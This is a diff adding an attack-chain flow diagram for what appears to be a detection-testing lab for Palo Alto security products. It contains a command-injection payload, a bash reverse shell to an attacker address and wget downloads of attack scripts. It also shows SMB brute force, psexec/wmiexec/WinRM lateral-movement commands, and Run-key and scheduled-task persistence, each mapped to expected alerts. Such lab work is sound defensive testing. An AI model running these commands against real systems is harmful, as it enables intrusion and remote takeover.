@@ -1,0 +1,317 @@
+╔═══════════════════════════════════════════════════════════════════════════════════╗
+║                    COMPLETE ATTACK CHAIN FLOW DIAGRAM                             ║
+║              Palo Alto Networks Security Product Testing Lab                      ║
+╚═══════════════════════════════════════════════════════════════════════════════════╝
+
+┌─────────────────────────────────────────────────────────────────────────────────┐
+│                           PHASE 1: INITIAL ACCESS                               │
+│                         (T1190 - Exploit Public-Facing Application)             │
+└─────────────────────────────────────────────────────────────────────────────────┘
+
+    ┌─────────────────┐
+    │  ATTACKER       │  1. HTTP POST to /api/diagnostic
+    │  10.0.1.100     │     Payload: 8.8.8.8; whoami
+    └────────┬────────┘
+             │                                    ALERTS GENERATED:
+             │ Command Injection                  ─────────────────
+             ▼                                    • Device Security: HTTP Command Injection
+    ┌─────────────────┐                          • Firewall: Suspicious POST request
+    │  ROUTER WEB     │  2. Vulnerable endpoint   • XSIAM: Web exploitation pattern
+    │  SERVER         │     executes shell cmd
+    │  10.0.1.1:8080  │
+    └────────┬────────┘
+             │
+             │ 3. Reverse shell
+             │    bash -i >& /dev/tcp/10.0.1.100/4444
+             ▼
+    ┌─────────────────┐                          ALERTS GENERATED:
+    │  NETCAT         │  4. Shell established     ─────────────────
+    │  LISTENER       │                           • Device Security: Reverse shell detected
+    │  10.0.1.100     │                           • Firewall: Outbound to port 4444
+    │  Port 4444      │                           • XSIAM: C2 communication pattern
+    └─────────────────┘
+
+    ATTACKER NOW HAS: Root shell on router (10.0.1.1)
+
+┌─────────────────────────────────────────────────────────────────────────────────┐
+│                      PHASE 2: DISCOVERY & ENUMERATION                           │
+│                         (T1046 - Network Service Scanning)                      │
+└─────────────────────────────────────────────────────────────────────────────────┘
+
+    ┌─────────────────┐
+    │  COMPROMISED    │  5. Download enum script
+    │  ROUTER         │     wget http://10.0.1.100:8000/enum.sh
+    │  (Root Access)  │
+    └────────┬────────┘
+             │
+             │ 6. Execute 02_post_exploit_enum.sh
+             ▼
+    ╔════════════════════════════════════════════════════════════════╗
+    ║                  ENUMERATION ACTIVITIES                        ║
+    ╠════════════════════════════════════════════════════════════════╣
+    ║                                                                ║
+    ║  [A] System Info Collection                                   ║
+    ║      • hostname, uname -a, ip addr                            ║
+    ║      • Network interfaces: eth0, eth1, eth2                   ║
+    ║      • Routes to: 192.168.1.0/24, 10.10.10.0/24              ║
+    ║                                                                ║
+    ║  [B] Ping Sweep (192.168.1.0/24)                              ║
+    ║      • Sends ICMP to .1-.254                                  ║
+    ║      • Discovers: 192.168.1.50 (ALIVE)                        ║
+    ║                                                                ║
+    ║  [C] Port Scan (192.168.1.50)                                 ║
+    ║      • TCP connect scan on common ports                       ║
+    ║      • OPEN: 135 (RPC), 139 (NetBIOS), 445 (SMB)             ║
+    ║      • OPEN: 3389 (RDP), 5985 (WinRM)                        ║
+    ║                                                                ║
+    ║  [D] Protocol Identification                                  ║
+    ║      • SMB ports → Windows host                               ║
+    ║      • Target identified: 192.168.1.50                        ║
+    ║                                                                ║
+    ║  [E] Save Results                                             ║
+    ║      • /tmp/.system_cache/windows_hosts.txt                   ║
+    ║      • /tmp/.system_cache/port_scan_results.txt               ║
+    ║                                                                ║
+    ╚════════════════════════════════════════════════════════════════╝
+
+                            ALERTS GENERATED:
+                            ─────────────────
+                            • Device Security: ICMP flood (ping sweep)
+                            • Device Security: Port scan from 10.0.1.1
+                            • Firewall: Excessive SMB connection attempts
+                            • XSIAM: Reconnaissance behavior pattern
+                            • XSIAM: Network discovery from compromised host
+
+    ATTACKER NOW KNOWS: Windows target at 192.168.1.50 with SMB, RDP, WinRM open
+
+┌─────────────────────────────────────────────────────────────────────────────────┐
+│                        PHASE 3: LATERAL MOVEMENT                                │
+│                    (T1110 - Brute Force, T1021 - Remote Services)              │
+└─────────────────────────────────────────────────────────────────────────────────┘
+
+    ┌─────────────────┐
+    │  COMPROMISED    │  7. Download lateral movement script
+    │  ROUTER         │     wget http://10.0.1.100:8000/03_lateral_movement.py
+    └────────┬────────┘
+             │
+             │ 8. Execute SMB brute force
+             ▼
+    ╔════════════════════════════════════════════════════════════════╗
+    ║              SMB BRUTE FORCE ATTACK                            ║
+    ╠════════════════════════════════════════════════════════════════╣
+    ║  Target: 192.168.1.50:445                                      ║
+    ║                                                                ║
+    ║  Attempt 1:  administrator:password        [-] FAILED          ║
+    ║  Attempt 2:  administrator:Password1       [-] FAILED          ║
+    ║  Attempt 3:  administrator:Password123     [+] SUCCESS!        ║
+    ║                                                                ║
+    ║  Valid Credentials Found:                                     ║
+    ║  └─ administrator:Password123                                 ║
+    ╚════════════════════════════════════════════════════════════════╝
+
+                            ALERTS GENERATED:
+                            ─────────────────
+                            • Cortex XDR: Multiple failed login attempts
+                            • Windows Event 4625: Failed authentication (x10+)
+                            • Windows Event 4624: Successful logon (Type 3)
+                            • Device Security: SMB brute force pattern
+                            • XSIAM: Credential stuffing attack
+
+             │
+             │ 9. Try lateral movement techniques
+             ▼
+    ╔════════════════════════════════════════════════════════════════╗
+    ║         LATERAL MOVEMENT TECHNIQUE SELECTION                   ║
+    ╠════════════════════════════════════════════════════════════════╣
+    ║                                                                ║
+    ║  [Option A] PsExec                                             ║
+    ║      psexec.py administrator:Password123@192.168.1.50 calc.exe║
+    ║      • Creates service on target                              ║
+    ║      • Uploads executable via SMB                             ║
+    ║      • Executes payload as SYSTEM                             ║
+    ║                                                                ║
+    ║  [Option B] WMI Exec                                           ║
+    ║      wmiexec.py administrator:Password123@192.168.1.50        ║
+    ║      • Uses WMI for remote execution                          ║
+    ║      • No file written to disk                                ║
+    ║      • Stealthier than PsExec                                 ║
+    ║                                                                ║
+    ║  [Option C] WinRM                                              ║
+    ║      evil-winrm -i 192.168.1.50 -u administrator -p Pass123   ║
+    ║      • PowerShell remoting                                    ║
+    ║      • Interactive shell                                      ║
+    ║                                                                ║
+    ║  [Option D] RDP                                                ║
+    ║      xfreerdp /v:192.168.1.50 /u:administrator /p:Pass123     ║
+    ║      • Full GUI access                                        ║
+    ║      • Most visible method                                    ║
+    ║                                                                ║
+    ║  [+] SELECTED: WMI Exec (Option B)                             ║
+    ║                                                                ║
+    ╚════════════════════════════════════════════════════════════════╝
+
+             │
+             │ 10. Execute WMI command
+             ▼
+    ┌─────────────────────────────────────────────────────────────┐
+    │         WMI REMOTE COMMAND EXECUTION                        │
+    │─────────────────────────────────────────────────────────────│
+    │  Source:      10.0.1.1 (Router)                             │
+    │  Target:      192.168.1.50 (Windows)                        │
+    │  Method:      Win32_Process.Create()                        │
+    │  Command:     powershell.exe -ExecutionPolicy Bypass        │
+    │               -File C:\Windows\Temp\payload.ps1             │
+    └─────────────────────────────────────────────────────────────┘
+
+                            ALERTS GENERATED:
+                            ─────────────────
+                            • Cortex XDR: Lateral movement via WMI
+                            • Cortex XDR: Remote WMI process creation
+                            • Windows Event 4672: Special privileges assigned
+                            • Windows Event 4688: Process creation (remote)
+                            • Cortex XDR: PowerShell spawned remotely
+                            • Device Security: WMI lateral movement
+                            • XSIAM: Attack chain progression (Phase 2→3)
+
+    ATTACKER NOW HAS: Remote code execution on Windows target (192.168.1.50)
+
+┌─────────────────────────────────────────────────────────────────────────────────┐
+│                          PHASE 4: PAYLOAD EXECUTION                             │
+│              (T1059.001 - PowerShell, T1547 - Persistence, etc.)               │
+└─────────────────────────────────────────────────────────────────────────────────┘
+
+    ┌─────────────────┐
+    │  WINDOWS        │  11. PowerShell payload executes
+    │  TARGET         │      04_windows_payload.ps1
+    │  192.168.1.50   │
+    └────────┬────────┘
+             │
+             │ 12. Multi-technique execution begins
+             ▼
+
+╔═══════════════════════════════════════════════════════════════════════════════╗
+║                   11 EXECUTION TECHNIQUES - calc.exe                          ║
+╠═══════════════════════════════════════════════════════════════════════════════╣
+║                                                                               ║
+║  [1] DIRECT PROCESS CREATION                                                 ║
+║      Start-Process -FilePath calc.exe                                        ║
+║      └─ ALERT: Process creation (baseline)                                   ║
+║                                                                               ║
+║  [2] WMI PROCESS CREATION                                                    ║
+║      Invoke-WmiMethod -Class Win32_Process -Name Create                      ║
+║      └─ ALERT: WMI abuse, suspicious process creation                        ║
+║                                                                               ║
+║  [3] INVOKE-EXPRESSION                                                       ║
+║      Invoke-Expression "Start-Process calc.exe"                              ║
+║      └─ ALERT: IEX usage, script execution                                   ║
+║                                                                               ║
+║  [4] BASE64 ENCODED COMMAND                                                  ║
+║      powershell.exe -EncodedCommand <base64>                                 ║
+║      └─ ALERT: Encoded PowerShell, obfuscation detected                      ║
+║                                                                               ║
+║  [5] SCHEDULED TASK CREATION                                                 ║
+║      Register-ScheduledTask -TaskName "SystemMaint" -Action ...              ║
+║      └─ ALERT: Scheduled task persistence, suspicious task                   ║
+║                                                                               ║
+║  [6] REGISTRY RUN KEY                                                        ║
+║      Set-ItemProperty HKCU:\...\Run -Name "SystemUpdate" -Value calc.exe    ║
+║      └─ ALERT: Registry persistence, Run key modification                    ║
+║                                                                               ║
+║  [7] COM OBJECT EXECUTION                                                    ║
+║      $Shell = New-Object -ComObject WScript.Shell; $Shell.Run(calc.exe)     ║
+║      └─ ALERT: COM automation abuse                                          ║
+║                                                                               ║
+║  [8] PROCESS HOLLOWING SIMULATION                                            ║
+║      Start notepad.exe (suspended) → Start calc.exe                          ║
+║      └─ ALERT: Process injection pattern, suspicious behavior                ║
+║                                                                               ║
+║  [9] NETWORK DOWNLOAD & EXECUTE                                              ║
+║      Copy-Item calc.exe → $env:TEMP\downloaded.exe; Start-Process            ║
+║      └─ ALERT: File download, WildFire analysis triggered                    ║
+║                                                                               ║
+║  [10] FILELESS EXECUTION                                                     ║
+║       $bytes = [IO.File]::ReadAllBytes('calc.exe'); [Reflection.Assembly]... ║
+║       └─ ALERT: In-memory execution, fileless attack                         ║
+║                                                                               ║
+║  [11] LOLBIN ABUSE                                                           ║
+║       cmd.exe /c start calc.exe                                              ║
+║       └─ ALERT: Living-off-the-land binary usage                             ║
+║                                                                               ║
+╚═══════════════════════════════════════════════════════════════════════════════╝
+
+                         TOTAL ALERTS GENERATED (PHASE 4):
+                         ──────────────────────────────────
+                         • Cortex XDR: 18-25 behavioral alerts
+                         • Windows Security Events: 30+ (4688, 4698, 4657)
+                         • Windows PowerShell Events: 15+ (4103, 4104)
+                         • WildFire: 1-3 file submissions
+                         • Device Security: 5-8 endpoint alerts
+                         • XSIAM: Complete attack chain correlation
+
+┌─────────────────────────────────────────────────────────────────────────────────┐
+│                         FINAL ATTACK CHAIN SUMMARY                              │
+└─────────────────────────────────────────────────────────────────────────────────┘
+
+    TIMELINE:
+    ─────────
+    T+00:00  →  Router exploitation (command injection)
+    T+00:30  →  Reverse shell established
+    T+01:00  →  Network enumeration begins (ping sweep, port scan)
+    T+05:00  →  Windows target identified (192.168.1.50)
+    T+06:00  →  SMB brute force attack
+    T+06:30  →  Valid credentials discovered
+    T+07:00  →  Lateral movement via WMI
+    T+07:30  →  PowerShell payload execution
+    T+08:00  →  11 techniques executed (calc.exe)
+    T+12:00  →  Attack chain complete
+
+    COMPROMISE PATH:
+    ────────────────
+    Attacker (10.0.1.100)
+        │
+        ├─→ Router Web Server (10.0.1.1:8080)  [Command Injection]
+        │
+        ├─→ Router Shell (10.0.1.1)             [Reverse Shell]
+        │
+        ├─→ Network Enumeration                 [Discovery]
+        │
+        ├─→ Windows Target (192.168.1.50)       [Lateral Movement]
+        │
+        └─→ Payload Execution                   [Impact: calc.exe × 11 methods]
+
+    TOTAL EXPECTED ALERTS:
+    ──────────────────────
+    [+]  Device Security:     8-12 alerts
+    [+]  Cortex XDR:          20-30 incidents
+    [+]  XSIAM:               1 complete attack chain (4 phases)
+    [+]  WildFire:            1-3 file submissions
+    ──────────────────────
+     TOTAL:               35-50+ alerts
+
+    MITRE ATT&CK COVERAGE:
+    ──────────────────────
+    • Initial Access:        T1190 (Exploit Public-Facing Application)
+    • Execution:             T1047, T1059.001, T1053.005
+    • Persistence:           T1547.001, T1053.005
+    • Defense Evasion:       T1027, T1140, T1055
+    • Discovery:             T1046, T1018, T1087
+    • Lateral Movement:      T1021.002, T1021.006
+    • Credential Access:     T1110.001
+    • Command & Control:     T1071.001
+
+╔═══════════════════════════════════════════════════════════════════════════════╗
+║                              LAB SUCCESS CRITERIA                             ║
+╠═══════════════════════════════════════════════════════════════════════════════╣
+║                                                                               ║
+║  [+]  Phase 1: Router compromised via command injection                       ║
+║  [+]  Phase 2: Network enumeration completed, Windows host identified         ║
+║  [+]  Phase 3: Lateral movement successful to Windows target                  ║
+║  [+]  Phase 4: calc.exe executed via 11 different techniques                  ║
+║  [+]  Minimum 30 alerts generated across all Palo Alto products               ║
+║  [+]  Complete attack chain visible in XSIAM                                  ║
+║  [+]  All techniques detected by Cortex XDR behavioral analytics              ║
+║  [+]  WildFire file submission successful                                     ║
+║                                                                               ║
+╚═══════════════════════════════════════════════════════════════════════════════╝
+
+END OF ATTACK FLOW DIAGRAM
